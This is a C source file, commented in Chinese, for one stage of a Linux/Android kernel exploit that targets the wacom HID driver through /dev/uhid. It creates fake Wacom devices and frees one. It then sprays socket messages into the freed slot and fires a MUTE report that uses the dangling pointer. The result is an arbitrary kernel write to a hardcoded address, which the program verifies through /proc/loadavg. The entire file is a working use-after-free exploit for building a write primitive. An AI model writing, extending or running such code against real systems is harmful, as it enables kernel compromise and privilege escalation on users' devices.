/*
 * phase_b2: 99491 写原语 —— 可自证的 oracle 验证（单次 MUTE，绝不循环）
 *
 * 为什么需要这个而不是直接跑 phase_b:
 *   phase_b 只能靠"进程有没有崩"来判断成功与否。崩了=失败，没崩=成功/或根
 *   本没走到写入（门禁挡掉了）。两种情况输出完全一样，没有判别力。
 *
 * 本程序用一个内核侧可回读的 oracle：
 *     avenrun[2]  (全局 unsigned long avenrun[3])
 *   它正是 /proc/loadavg 的 15 分钟字段，shell 权限可直接读回。
 *
 *   写入 8 字节恰好完整覆盖 avenrun[2]，不会溢到相邻变量：
 *     u64 = (value<<32) | (0<<16 | 3)
 *   即低 32 位 = 0x00000003 (type=3, code=0)，高 32 位 = value。
 *
 *   预期可观测变化：/proc/loadavg 第 3 个字段
 *     value==0  -> 变成 0.00
 *     value!=0  -> 变成巨大数
 *   两者都 != 基线（~16.95），且是"位模式"级的突变，不是自然波动。
 *
 * 设计原则：
 *   1. 单次 MUTE，绝不循环，避免二次触发把结果搞乱
 *   2. 每次读 loadavg 连续采样，排除 5 秒自然更新干扰
 *   3. 打印清晰判据，程序自己给 CHANGED/UNCHANGED 结论
 *
 * 用法: phase_b2 <cpu> <pairs> <payload_file>
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/uhid.h>

#define WACOM_VID   0x056a
#define PHYS_COMMON "phasetest/33"

/* oracle: avenrun[2] 运行时地址（slide=0x1e8c200000 已三重校验） */
#define ORACLE_ADDR 0xffffffde9770e5a0ULL

static const unsigned char rdesc_touch[] = {
    0x05, 0x0d, 0x09, 0x04, 0xa1, 0x01, 0x85, 0x01,
    0x05, 0x0d, 0x09, 0x22, 0xa1, 0x00,
    0x09, 0x42, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0x09, 0x32, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0x05, 0x01, 0x09, 0x30,
    0x16, 0x01, 0x00, 0x26, 0xff, 0x7f,
    0x75, 0x10, 0x95, 0x01, 0x81, 0x02,
    0x09, 0x31, 0x26, 0xff, 0x7f, 0x75, 0x10, 0x95, 0x01, 0x81, 0x02,
    0xc0,
    0x05, 0x0d, 0x09, 0x39, 0xa1, 0x00,
    0x06, 0x0d, 0xff, 0x0a, 0x81, 0x09,
    0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0xc0, 0xc0
};

static const unsigned char rdesc_pad[] = {
    0x05, 0x0d, 0x09, 0x39, 0xa1, 0x01, 0x85, 0x02,
    0x05, 0x0d, 0x09, 0x20, 0xa1, 0x02,
    0x05, 0x0d, 0x09, 0x39, 0xa1, 0x00,
    0x06, 0x0d, 0xff, 0x0a, 0x86, 0x09,
    0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0x06, 0x0d, 0xff, 0x0a, 0x54, 0x04,
    0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0xc0, 0xc0, 0xc0
};

static long now_us(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec * 1000000L + ts.tv_nsec / 1000L;
}

static int uhid_create(int fd, const char *name, const char *phys, unsigned pid,
                       const unsigned char *rd, size_t rl) {
    static struct uhid_event ev;
    memset(&ev, 0, sizeof(ev));
    ev.type = UHID_CREATE2;
    snprintf((char *)ev.u.create2.name, sizeof(ev.u.create2.name), "%s", name);
    snprintf((char *)ev.u.create2.phys, sizeof(ev.u.create2.phys), "%s", phys);
    ev.u.create2.vendor = WACOM_VID;
    ev.u.create2.product = pid;
    ev.u.create2.version = 0x0100;
    ev.u.create2.bus = BUS_USB;
    ev.u.create2.rd_size = rl;
    memcpy(ev.u.create2.rd_data, rd, rl);
    return write(fd, &ev, sizeof(ev)) == sizeof(ev) ? 0 : -1;
}

static int uhid_destroy(int fd) {
    struct uhid_event ev;
    memset(&ev, 0, sizeof(ev));
    ev.type = UHID_DESTROY;
    return write(fd, &ev, sizeof(ev)) == sizeof(ev) ? 0 : -1;
}

static int uhid_input(int fd, const unsigned char *data, size_t len) {
    static struct uhid_event ev;
    memset(&ev, 0, sizeof(ev));
    ev.type = UHID_INPUT2;
    ev.u.input2.size = len;
    memcpy(ev.u.input2.data, data, len);
    return write(fd, &ev, sizeof(ev)) == sizeof(ev) ? 0 : -1;
}

static void pump(int fd, long ms) {
    long dl = now_us() / 1000 + ms;
    struct uhid_event ev;
    int fc = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, fc | O_NONBLOCK);
    while (now_us() / 1000 < dl) {
        if (read(fd, &ev, sizeof(ev)) <= 0) usleep(400);
    }
    fcntl(fd, F_SETFL, fc);
}

/* 读 /proc/loadavg，抽出第 3 字段（15 分钟，对应 avenrun[2]） */
static int read_av15(char *out, size_t n) {
    FILE *f = fopen("/proc/loadavg", "r");
    if (!f) { snprintf(out, n, "ERR"); return -1; }
    char l1[32] = {0}, l5[32] = {0}, l15[32] = {0};
    int got = fscanf(f, "%31s %31s %31s", l1, l5, l15);
    fclose(f);
    if (got != 3) { snprintf(out, n, "PARSE_ERR"); return -1; }
    snprintf(out, n, "%s", l15);
    return 0;
}

int main(int argc, char **argv) {
    int cpu   = argc > 1 ? atoi(argv[1]) : 0;
    int pairs = argc > 2 ? atoi(argv[2]) : 400;
    const char *pfile = argc > 3 ? argv[3] : "/data/local/tmp/payload_av.bin";

    FILE *pf = fopen(pfile, "rb");
    if (!pf) { perror("payload"); return 2; }
    static unsigned char pl[4096];
    size_t pl_len = fread(pl, 1, sizeof(pl), pf);
    fclose(pf);

    unsigned long long ev0   = *(unsigned long long *)(pl + 0x028);
    unsigned long long abs0  = *(unsigned long long *)(pl + 0x098);
    unsigned long long p140  = *(unsigned long long *)(pl + 0x140);
    unsigned long long p148  = *(unsigned long long *)(pl + 0x148);
    unsigned int numv = *(unsigned int *)(pl + 0x568);
    unsigned int maxv = *(unsigned int *)(pl + 0x56c);
    unsigned long long vals = *(unsigned long long *)(pl + 0x570);
    unsigned char guard = pl[0x598];

    printf("=== phase_b2 (ONE SHOT, oracle=avenrun[2]) ===\n");
    printf("pid=%d cpu=%d pairs=%d\n", getpid(), cpu, pairs);
    printf("payload=%s len=%zu\n", pfile, pl_len);
    printf("  0x028 evbit[0] = 0x%llx  bit3(EV_ABS)=%d %s\n", ev0,
           (int)((ev0 >> 3) & 1), ((ev0 >> 3) & 1) ? "OK" : "!! 会跳过触发");
    printf("  0x098 absbit[0]= 0x%llx  bit0=%d %s\n", abs0,
           (int)(abs0 & 1), (abs0 & 1) ? "OK" : "!! 会跳过写入");
    printf("  0x140 ptr      = 0x%llx %s\n", p140,
           p140 ? "!! 非0会走evdev分支" : "OK(0)");
    printf("  0x148 absinfo  = 0x%llx %s\n", p148,
           p148 ? "!! 非0会读absinfo" : "OK(0)");
    printf("  0x568 num_vals = %u\n", numv);
    printf("  0x56c max_vals = %u\n", maxv);
    printf("  0x598 guard    = 0x%02x %s\n", guard,
           guard ? "(立即返回,不写)" : "(会写入)");
    printf("  vals           = 0x%016llx\n", vals);
    printf("  oracle         = 0x%016llx (avenrun[2])\n", (unsigned long long)ORACLE_ADDR);
    printf("  vals==oracle   = %s\n", vals == ORACLE_ADDR ? "YES (写入即改 loadavg)" : "NO");
    fflush(stdout);

    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(set), &set) != 0) {
        printf("pin fail: %s\n", strerror(errno));
        return 3;
    }
    printf("pinned cpu=%d running=%d\n", cpu, sched_getcpu());

    /* 基线：连续 3 次读，确认稳定 */
    char b1[32], b2[32], b3[32];
    read_av15(b1, sizeof(b1));
    usleep(20000); read_av15(b2, sizeof(b2));
    usleep(20000); read_av15(b3, sizeof(b3));
    printf("BASELINE loadavg15 = %s / %s / %s\n", b1, b2, b3);
    fflush(stdout);

    int (*sp)[2] = calloc(pairs, sizeof(int[2]));
    int made = 0;
    for (int i = 0; i < pairs; i++) {
        if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sp[i]) < 0) continue;
        int sb = 8 << 20;
        setsockopt(sp[i][0], SOL_SOCKET, SO_SNDBUF, &sb, sizeof(sb));
        setsockopt(sp[i][1], SOL_SOCKET, SO_RCVBUF, &sb, sizeof(sb));
        made++;
    }
    printf("socketpairs=%d\n", made);

    int fdt = open("/dev/uhid", O_RDWR | O_CLOEXEC);
    int fdp = open("/dev/uhid", O_RDWR | O_CLOEXEC);
    if (fdt < 0 || fdp < 0) { printf("uhid open fail: %s\n", strerror(errno)); return 4; }

    if (uhid_create(fdt, "pb2-touch", PHYS_COMMON, 0x1101,
                    rdesc_touch, sizeof(rdesc_touch)) < 0) { printf("ct fail\n"); return 5; }
    pump(fdt, 100);
    if (uhid_create(fdp, "pb2-pad", PHYS_COMMON, 0x1102,
                    rdesc_pad, sizeof(rdesc_pad)) < 0) { printf("cp fail\n"); return 5; }
    pump(fdp, 100);
    usleep(300000);
    pump(fdt, 30); pump(fdp, 30);
    printf("both devices created, wacom bound\n");
    fflush(stdout);

    /* ★ 释放 touch */
    long t1 = now_us();
    uhid_destroy(fdt);
    close(fdt);
    fdt = -1;

    /* ★ 立即 spray payload 抢槽位 */
    int sent = 0;
    for (int i = 0; i < made; i++) {
        if (send(sp[i][0], pl, pl_len, MSG_DONTWAIT) >= 0) sent++;
    }
    long t2 = now_us();
    printf("destroy+spray: %d msgs in %ldus\n", sent, t2 - t1);
    fflush(stdout);

    /* 控制点：MUTE 前再读一次，确认不是我们 spray 引起的 */
    char c1[32];
    read_av15(c1, sizeof(c1));
    printf("PRE-MUTE loadavg15 = %s\n", c1);
    fflush(stdout);

    /* ★ 唯一一次 MUTE → 触发 wacom_wac_irq 解引用悬垂 input_dev */
    printf(">>> firing MUTE (once)\n");
    fflush(stdout);
    long t3 = now_us();
    unsigned char rep[2] = { 0x02, 0x02 };
    uhid_input(fdp, rep, sizeof(rep));
    pump(fdp, 50);
    long t4 = now_us();
    printf("<<< MUTE returned in %ldus (no panic)\n", t4 - t3);
    fflush(stdout);

    /* ★ 立刻读 oracle，连采 5 次跨约 1 秒 */
    char a[5][32];
    for (int i = 0; i < 5; i++) {
        read_av15(a[i], sizeof(a[i]));
        if (i < 4) usleep(250000);
    }
    printf("POST-MUTE loadavg15 = %s %s %s %s %s\n",
           a[0], a[1], a[2], a[3], a[4]);
    fflush(stdout);

    /* ★ 判据 */
    int changed = 0;
    for (int i = 0; i < 5; i++) {
        if (strcmp(a[i], b3) != 0 && strcmp(a[i], c1) != 0) changed++;
    }
    printf("\n========================================\n");
    if (changed > 0) {
        printf("VERDICT: WRITE CONFIRMED (PASS)\n");
        printf("  oracle 在 MUTE 后发生变化: %s -> %s\n", c1, a[0]);
        printf("  说明 vals 写入真的落到了 avenrun[2]\n");
    } else {
        printf("VERDICT: NO WRITE OBSERVED (UNCHANGED)\n");
        printf("  oracle 未变，可能原因:\n");
        printf("   1) 门禁未通过（0x028/0x098 位没置对）\n");
        printf("   2) MUTE 没走到 EV_ABS code=0 那条路径\n");
        printf("   3) payload 没占住槽位，vals 读到别人的值\n");
        printf("  需要 ftrace 进一步区分\n");
    }
    printf("========================================\n");
    fflush(stdout);

    /* 清理 */
    char tmp[4096];
    for (int i = 0; i < made; i++)
        while (recv(sp[i][1], tmp, sizeof(tmp), MSG_DONTWAIT) > 0) ;
    if (fdp >= 0) { uhid_destroy(fdp); close(fdp); }

    printf("=== phase_b2 done, SURVIVED, pid=%d ===\n", getpid());
    fflush(stdout);
    return 0;
}